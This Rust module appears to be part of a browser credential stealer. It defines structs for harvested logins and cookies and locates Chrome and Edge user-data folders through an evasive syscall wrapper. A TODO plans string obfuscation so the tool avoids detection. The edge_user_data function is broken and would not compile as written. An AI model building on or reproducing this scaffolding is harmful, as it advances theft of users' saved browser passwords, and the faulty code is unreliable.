use alloc::string::String;

pub mod chromium;
pub mod finder;
pub mod nss;

#[derive(Debug)]
pub struct Login {
    username: String,
    password: String,
    url: String,
}

#[derive(Debug)]
pub struct Cookie {}

#[cfg(target_os = "windows")]
mod constants {
    use core::cell::{LazyCell, OnceCell};

    use wsyscall_rs::{wintypes::WindowsString, SusGetEnvironmentVariable};

    /* TODO:
     * Add string obfuscation
     * Explore whether iterators should be built for common paths
     * Explore whether paths should be retrieved dynamically (e.g registry??)
     */
    static mut LOCAL_APP_DATA: LazyCell<WindowsString> =
        LazyCell::new(|| SusGetEnvironmentVariable("LOCALAPPDATA").unwrap());

    pub static mut CHROME_USER_DATA: LazyCell<WindowsString> = LazyCell::new(|| {
        let mut copy = unsafe { &*LOCAL_APP_DATA }.clone();
        copy.push_str("\\Google\\Chrome\\User Data");
        copy
    });

    pub static EDGE_USER_DATA: OnceCell<WindowsString> = OnceCell::new();

    pub fn edge_user_data() -> &'static WindowsString {
        EDGE_USER_DATA.get()
        let mut copy = unsafe { &*LOCAL_APP_DATA }.clone();
        copy.push_str("\\Microsoft\\Edge\\User Data");
        copy
    }
    // TODO: add other chromium browsers
}

pub(super) use constants::*;
